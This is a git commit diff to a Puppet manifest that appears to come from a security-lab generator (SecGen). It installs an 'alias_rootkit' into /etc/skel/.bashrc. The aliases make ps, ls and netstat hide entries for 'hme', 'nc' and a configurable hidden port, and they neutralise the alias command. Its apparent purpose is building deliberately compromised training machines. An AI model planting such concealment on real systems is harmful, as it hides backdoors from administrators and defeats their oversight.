bab7acbc432d29fbe30e43e2639ee40ef598f6f7
Z. Cliffe Schreuders <code.cliffe@schreuders.org>
2018-12-06 16:31:32 +0000

    lab updates

--- modules/utilities/unix/compromised/alias_rootkit/manifests/install.pp
+++ modules/utilities/unix/compromised/alias_rootkit/manifests/install.pp
@@ -1,6 +1,9 @@
 class alias_rootkit::install {
 
-  $aliases = "alias ps='f(){ ps \"$@\" |grep -v 'hme\|nc'; unset -f f; }; f'; alias ls='f(){ ls \"$@\" |grep -v hme |column -c 80; unset -f f; }; f'; alias netstat='f(){ netstat \"$@\" |grep -v 44|grep -v hme; unset -f f; }; f'; alias alias='true'"
+  $secgen_parameters = secgen_functions::get_parameters($::base64_inputs_file)
+  $hidden_port = $secgen_parameters['hidden_port'][0]
+
+  $aliases = "alias ps='f(){ ps \"$@\" |grep -v 'hme\|nc\|$hidden_port'; unset -f f; }; f'; alias ls='f(){ ls \"$@\" |grep -v hme |column -c 80; unset -f f; }; f'; alias netstat='f(){ netstat \"$@\" |grep -v '44\|hme\|nc\|$hidden_port'; unset -f f; }; f'; alias alias='true'"
 
   file_line { 'Append a line to /etc/skel/.bashrc':
     path => '/etc/skel/.bashrc',
